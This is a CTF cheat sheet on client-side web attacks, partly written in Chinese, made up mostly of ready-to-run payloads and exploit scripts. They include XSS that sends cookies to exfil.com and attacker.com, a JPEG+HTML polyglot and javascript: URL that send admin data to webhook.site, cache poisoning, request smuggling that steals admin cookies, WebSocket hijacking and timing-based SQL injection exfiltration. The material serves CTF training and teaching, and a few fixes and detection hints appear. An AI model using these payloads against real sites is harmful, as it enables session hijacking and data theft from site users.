# CTF Web - Client-Side Attacks

## Table of Contents
- [XSS Payloads](#xss-payloads)
  - [Basic](#basic)
  - [Cookie Exfiltration](#cookie-exfiltration)
  - [Filter Bypass](#filter-bypass)
  - [Hex/Unicode Bypass](#hexunicode-bypass)
- [DOMPurify Bypass via Trusted Backend Routes](#dompurify-bypass-via-trusted-backend-routes)
- [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
- [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
- [Cache Poisoning](#cache-poisoning)
  - [X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)](#x-forwarded-host-cdn-template-fetch-poisoning-csaw-2018)
- [Hidden DOM Elements](#hidden-dom-elements)
- [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
- [Magic Link + Redirect Chain XSS](#magic-link--redirect-chain-xss)
- [Content-Type via File Extension](#content-type-via-file-extension)
- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
- [WebSocket Attacks (CSWSH & Smuggling)](#websocket-attacks-cswsh--smuggling)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
- [JSFuck Decoding](#jsfuck-decoding)
- [AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)](#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)
- [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
  - [Why it works](#why-it-works)
  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1--redirect-bot-via-meta-refresh-csp-bypass)
  - [Step 2 — Timing oracle via image loads](#step-2--timing-oracle-via-image-loads)
  - [Step 3 — Character-by-character extraction](#step-3--character-by-character-extraction)
  - [Step 4 — Host exploit and tunnel](#step-4--host-exploit-and-tunnel)
- [jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)](#jquery-locationhash-css-selector-timing-leak-hxp-2018)

---

## XSS Payloads

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Cookie Exfiltration
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literal -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space -->
```

### Hex/Unicode Bypass
- Hex encoding: `\x3cscript\x3e`
- HTML entities: `&#60;script&#62;`

---

## DOMPurify Bypass via Trusted Backend Routes

Frontend sanitizes before autosave, but backend trusts autosave — no sanitization.
Exploit: POST directly to `/api/autosave` with XSS payload.

---

## JavaScript String Replace Exploitation

`.replace()` special patterns: `$\`` = content BEFORE match, `$'` = content AFTER match
Payload: `<img src="abc$\`<img src=x onerror=alert(1)>">`

---

## Client-Side Path Traversal (CSPT)

Frontend JS uses URL param in fetch without validation:
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
Exploit: `/user/profile?id=../admin/addAdmin` → fetches `/admin/addAdmin` with CSRF body

Parameter pollution: `/user/profile?id=1&id=../admin/addAdmin` (backend uses first, frontend uses last)

---

## Cache Poisoning

CDN/cache keys only on URL:
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
# All visitors to /search?query=harmless get XSS
```

### X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)

**Pattern:** A CDN fronting the app keys cached responses only on path + query. A backend Mustache template renders a `<script src="https://{{host}}/cdn/app.js">` tag where `{{host}}` comes from the `X-Forwarded-Host` header. The attacker sends one request with `X-Forwarded-Host: attacker.tld`, Varnish caches the response for 120 seconds, and every subsequent visitor loads JavaScript from the attacker origin.

```http
GET /cdn/app.js HTTP/1.1
Host: target.tld
X-Forwarded-Host: attacker.tld
```

```python
import requests, time
# Poison the cache
requests.get("https://target.tld/cdn/app.js",
             headers={"X-Forwarded-Host": "attacker.tld"})
# Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
```

**Key insight:** Cache keys rarely include request headers, even when those headers feed the response body. Any header the backend reflects into HTML (`Host`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) becomes a web cache poisoning vector the moment the response is cached. Use `Vary: X-Forwarded-Host` or strip these headers at the edge; attackers hunt them with Burp Param Miner (`unkeyed header discovery`).

**References:** CSAW CTF Qualification Round 2018 — Hacker Movie Club, writeup 11277

---

## Hidden DOM Elements

Proof/flag in `display: none`, `visibility: hidden`, `opacity: 0`, or off-screen elements:
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));

// Find all hidden content
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

---

## React-Controlled Input Programmatic Filling

React ignores direct `.value` assignment. Use native setter + events:
```javascript
const input = document.querySelector('input[placeholder="SDG{...}"]');
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
input.dispatchEvent(new Event('change', { bubbles: true }));
```

Works for React, Vue, Angular. Essential for automated form filling via DevTools.

---

## Magic Link + Redirect Chain XSS
```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// Sets auth cookies, then redirects to attacker-controlled XSS page
```

---

## Content-Type via File Extension
```javascript
// @fastify/static determines Content-Type from extension
noteId = '<img src=x onerror="alert(1)">.html'
// Response: Content-Type: text/html → XSS
```

---

## DOM XSS via jQuery Hashchange (Crypto-Cat)

**Pattern:** jQuery's `$()` selector sink combined with `location.hash` source and `hashchange` event handler. Modern jQuery patches block direct `$(location.hash)` HTML injection, but iframe-triggered hashchange bypasses it.

**Vulnerable pattern:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**Exploit via iframe:** Trigger hashchange without direct user interaction by loading the target in an iframe, then modifying the hash via `onload`:
```html
<iframe src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**Key insight:** The iframe's `onload` fires after the initial load, then changing `this.src` triggers a `hashchange` event in the target page. The hash content (`<img src=x onerror=print()>`) passes through jQuery's `$()` which interprets it as HTML, creating a DOM element with the XSS payload.

**Detection:** Look for `$(location.hash)`, `$(window.location.hash)`, or any jQuery selector that accepts user-controlled input from URL fragments.

---

## Shadow DOM XSS

**Closed Shadow DOM exfiltration (Pragyan 2026):** Wrap `attachShadow` in a Proxy to capture shadow root references:
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.

**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.

---

## DOM Clobbering + MIME Mismatch

**MIME type confusion (Pragyan 2026):** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.

**Form-based DOM clobbering:**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

---

## HTTP Request Smuggling via Cache Proxy

**Cache proxy desync (Pragyan 2026):** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.

**Cookie theft pattern:**
1. Create cached resource (e.g., blog post)
2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
3. Cache proxy returns cached response, doesn't consume POST body
4. Admin bot's next request bytes fill the POST body → stored on server
5. Read stored request to extract admin's cookies

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

---

## WebSocket Attacks (CSWSH & Smuggling)

### Cross-Site WebSocket Hijacking (CSWSH)

**Pattern:** 后端 WS 端点（`/ws`、`/socket`）仅靠 Cookie 鉴权、**不校验 `Origin` 头**。攻击者页面执行 `new WebSocket('wss://target/ws')` → 浏览器自动带上目标站 Cookie → 连接成功 → 可读服务端推送的消息，也可伪造消息触发操作（改设置、发消息、下单）。

**Detection（三连问）：**
1. 握手响应（`101 Switching Protocols`）在**无/任意 Origin** 时仍成功？手工握手：`curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom|base64)" -H "Sec-WebSocket-Version: 13" http://TARGET/ws`。
2. 会话凭证在 Cookie 里（而非握手内单独 token）？
3. 流量是 `ws://`（明文）而非 `wss://`？→ 可中间人改写消息。

**Exploit（挂在自己页面，让 admin bot 访问）：**
```javascript
const ws = new WebSocket('wss://target/ws');
ws.onopen = () => ws.send('{"cmd":"read_flag"}');   // 发命令
ws.onmessage = e => new Image().src =
  'https://attacker/?d=' + encodeURIComponent(e.data); // 读消息
```
注意：CSP/SameSite 缓解有限——WS 握手不执行页面脚本，`connect-src` 才拦（缺省则取 `default-src`）；WS 握手请求的 Cookie 行为因浏览器与导航上下文而异，**服务端校验 Origin 才是正解**。浏览器握手必带 Origin，但非浏览器客户端可伪造，故 Origin 校验只挡浏览器攻击面（如 admin bot）。

### WebSocket Smuggling & Subprotocol Injection

**Concept:** WS 首包是 `GET` + `Upgrade`，与 HTTP 共享解析器（代理/网关）。代理对 Upgrade 透传处理或缓冲区不一致时，WS 帧内容（含 CRLF）可能被后继 HTTP 解析器当新请求读走（request smuggling 的升级变体）。帧里的 `\r\n\r\n` 是测试点。

**Subprotocol 选择器注入:** 客户端可声明任意 `Sec-WebSocket-Protocol: a, b`；若服务端把提议值**原样拼进响应头**且不过滤 → CRLF 头注入（`a\r\nX-Injected: 1`）。即使无 CRLF，subprotocol 常被当作"命令分派/能力协商"参数 → 选危险 subprotocol 触发调试模式/提权逻辑。

### Exploit Chains

- **XSS in WS context:** `ws.onmessage` 把 `e.data` 直接塞进 `innerHTML`/`eval` → 服务端发一条含 payload 的消息即 XSS，**绕过所有 HTTP 侧输入过滤**（payload 不经过 HTTP 参数）。
- **WS 消息 → 后端注入:** 服务端把 WS 当"内部可信通道"，消息字段拼进 SQL/命令/模板 → WS 是 SQLi/命令注入的传送带。
- **CSWSH + admin bot:** 挑战的 bot 访问你的页面，页面后台开 WS → 读管理消息/触发管理动作（与 [Admin Bot javascript: URL Scheme Bypass](#admin-bot-javascript-url-scheme-bypass-dicectf-2026) 类挑战同构）。

**Detection:** 源码找 `new WebSocket(`/`ws:`/`wss:` 地址与服务端 upgrade 路由；`Sec-WebSocket-Protocol` 客户端可控时测 CRLF；admin bot 题把 WS 当注入通道测。

---

## CSS/JS Paywall Bypass

**Pattern (Great Paywall, MetaCTF 2026):** Article content is fully present in the HTML but hidden behind a CSS/JS overlay (`position: fixed; z-index: 99999; backdrop-filter: blur(...)` with a "Subscribe" CTA).

**Quick solve:** `curl` the page — no CSS/JS rendering means the full article (and flag) are in the raw HTML.

```bash
curl -s https://target/article | grep -i "flag\|CTF{"
```

**Alternative approaches:**
- View page source in browser (Ctrl+U)
- Browser DevTools → delete the overlay element
- Disable JavaScript in browser settings
- `document.querySelector('#paywall-overlay').remove()` in console
- Googlebot user-agent: `curl -H "User-Agent: Googlebot" https://target/article`

**Key insight:** Many paywalls are client-side DOM overlays — the content is always in the HTML. The leetspeak hint "paywalls are just DOM" confirms this. Always try `curl` or view-source first before more complex approaches.

**Detection:** Look for `<div>` elements with `position: fixed`, high `z-index`, and `backdrop-filter: blur()` in the page source — these are overlay-based paywalls.

---

## JPEG+HTML Polyglot XSS (EHAX 2026)

**Pattern (Metadata Meyham):** File upload accepts JPEG, serves uploaded files with permissive MIME type. Admin bot visits reported files.

**Attack:** Create a JPEG+HTML polyglot — valid JPEG header followed by HTML/JS payload:
```python
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

# HTML payload appended after JPEG data
html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  // Fetch admin page content
  var r = await fetch("/admin");
  var t = await r.text();
  // Exfiltrate via self-upload (stays on same origin)
  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
  var b = new Blob([j], {type:'image/jpeg'});
  var f = new FormData();
  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
  await fetch('/upload', {method:'POST', body:f});
  // Also try external webhook
  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
# Upload as .html with image/jpeg content type
```

**PoW bypass:** Many CTF report endpoints require SHA-256 proof-of-work:
```python
import hashlib
nonce = 0
while True:
    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
    if h.startswith('0' * difficulty):
        break
    nonce += 1
```

**Exfiltration methods (ranked by reliability):**
1. **Self-upload:** Fetch `/admin`, upload result as filename → check `/files` for new uploads
2. **Webhook:** `fetch('https://webhook.site/ID?flag='+data)` — may be blocked by CSP
3. **DNS exfil:** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'` — bypasses most CSP

**Key insight:** JPEG files are tolerant of trailing data. Browsers parse HTML from anywhere in the response when MIME allows it. The polyglot is simultaneously a valid JPEG and valid HTML.

---

## JSFuck Decoding

**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```

---

## AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)

**Pattern:** AngularJS versions before 1.6 sandbox expressions to prevent arbitrary JavaScript execution in `{{ }}` bindings. The sandbox relies on `charAt` to validate identifiers character by character. Override `charAt` with `trim` on `String.prototype` to bypass the check, then use `$eval` to execute arbitrary JS.

**Payload:**
```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
```

**How it works:**
1. `toString().constructor.prototype` accesses `String.prototype`
2. `a.charAt=a.trim` replaces `charAt` with `trim` on all strings
3. The sandbox calls `charAt(0)` on identifiers to validate them -- but `trim` returns the full string instead of a single character
4. This breaks the character-by-character validation, allowing any expression
5. `$eval('expression')` evaluates arbitrary JavaScript in the Angular scope

**Shorter variants for different AngularJS versions:**
```javascript
<!-- AngularJS 1.5.x -->
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}

<!-- AngularJS 1.4.x -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}

<!-- AngularJS 1.3.x -->
{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
```

**Detection:** Look for `ng-app` or `ng-controller` directives in HTML, AngularJS script includes (`angular.js` or `angular.min.js`), and `{{ }}` expression bindings that reflect user input.

**Key insight:** The sandbox relies on `charAt` to validate identifiers. Replacing it with `trim` (which returns the full string) bypasses the character-by-character check, allowing arbitrary expression evaluation. AngularJS 1.6+ removed the sandbox entirely (acknowledging it was never a security boundary), but many CTFs and legacy apps still use older versions.

---

## Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)

**Pattern (Mirror Temple):** Admin bot navigates to user-supplied URL, validates with `new URL()` which only checks syntax — not protocol scheme. `javascript:` URLs pass validation and execute arbitrary JS in the bot's authenticated context.

**Vulnerable validation:**
```javascript
try {
  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
} catch {
  process.exit(1)
}
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
```

**Exploit:**
```bash
# 1. Create authenticated session (bot requires valid cookie)
curl -i -X POST 'https://target/postcard-from-nyc' \
  --data-urlencode 'name=test' \
  --data-urlencode 'flag=dice{test}' \
  --data-urlencode 'portrait='
# Extract save=... cookie from Set-Cookie header

# 2. Submit javascript: URL to report endpoint
curl -X POST 'https://target/report' \
  -H 'Cookie: save=YOUR_COOKIE' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

**Why CSP/SRI don't help (B-Side variant):** The B-Side adds inlined CSS, SRI integrity hashes on scripts, and strict CSP. None of these matter because `javascript:` URLs execute in a **navigation context** — the bot navigates to the JS URL directly, not injecting into an existing page. The CSP of the target page is irrelevant since the JS runs before any page loads.

**Fix:**
```javascript
const u = new URL(targetUrl)
if (!['http:', 'https:'].includes(u.protocol)) {
  process.exit(1)
}
```

**Key insight:** `new URL()` is a **syntax** validator, not a **security** validator. It accepts `javascript:`, `data:`, `file:`, `blob:`, and other dangerous schemes. Any admin bot or SSRF handler using `new URL()` alone for validation is vulnerable. Always allowlist protocols explicitly.

---

## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

**Pattern:** Admin bot visits attacker page → JavaScript makes cross-origin requests to `localhost` GraphQL endpoint → measures time-based SQLi via image load timing → exfiltrates data character by character.

### Why it works

1. **GraphQL GET CSRF:** Many GraphQL implementations accept GET requests (not just POST+JSON). GET requests with images bypass CORS preflight — no `OPTIONS` check needed.
2. **Bot runs on localhost:** The admin bot's browser can reach `localhost:1337/graphql` which is restricted from external access.
3. **Image error timing:** `new Image().src = url` fires `onerror` after the server responds. If SQL `SLEEP(1)` executes, the response is slow → timing difference reveals whether a character matches.

### Step 1 — Redirect bot via meta refresh (CSP bypass)

When CSP blocks inline scripts, use HTML injection with `<meta>` redirect:
```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
```

The bot navigates to the attacker page, where JavaScript executes freely (different origin, no CSP restriction).

### Step 2 — Timing oracle via image loads

```javascript
const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onload = () => resolve(0);
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};

const xsLeaks = async (query) => {
    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
        encodeURIComponent(query);
    let delay = await imageLoadTime(imgURL);
    return delay >= 1000;  // SLEEP(1) threshold
};
```

### Step 3 — Character-by-character extraction

```javascript
let sqlTemp = `query {
    RansomChat(enc_id: "123' and __LEFT__ = __RIGHT__)-- -")
    {id, enc_id, message, created_at} }`;

let readQueryTemp = `(select sleep(1) from dual where
    BINARY(SUBSTRING((select password from db.users
    where username = 'target'),__POS__,1))`;

let flag = '';
for (let pos = 1; ; pos++) {
    for (let c of charset) {
        let readQuery = readQueryTemp.replace('__POS__', pos);
        let sql = sqlTemp.replace('__LEFT__', readQuery)
                         .replace('__RIGHT__', `'${c}'`);
        if (await xsLeaks(sql)) {
            flag += c;
            new Image().src = exfilURL + '?d=' + encodeURIComponent(flag);
            break;
        }
    }
}
```

### Step 4 — Host exploit and tunnel

```bash
# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
cloudflared tunnel --url http://localhost:8888
python3 -m http.server 8888
```

**Key insight:** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.

**Detection:** Chat/message features with HTML injection + admin bot + GraphQL endpoint with SQL injection + localhost-only restrictions.

---

## jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)

**Pattern:** Target page calls `$(location.hash).addClass(...)`. Passing a URL fragment that parses as a CSS selector causes jQuery to invoke Sizzle, which walks the DOM matching the selector. Stacking deeply nested `:has()` pseudo-classes blows up selector evaluation time predictably (~2 s) only when the selector *matches*, creating a Boolean timing oracle on any attribute the bot's DOM exposes (for example `body[data-user-id^='1']`).

```text
http://127.0.0.1/?id=...#*:has(*:has(*:has(*:has(*:has(body[data-user-id^='1'])))))
```

Exfiltrate by firing two `new Image().src` requests to attacker-controlled endpoints (`/firstping`, `/secondping`) around the `addClass` call and measuring the delta: ~20 ms = mismatch, ~2 s = match.

**Key insight:** jQuery's `$` with a string argument treats anything beginning with `<` as HTML and everything else as a selector. Any sink that lets an attacker put arbitrary text into `$()` becomes both an XSS and a selector-timing oracle.

**References:** hxp CTF 2018 — µblog, writeup 12554
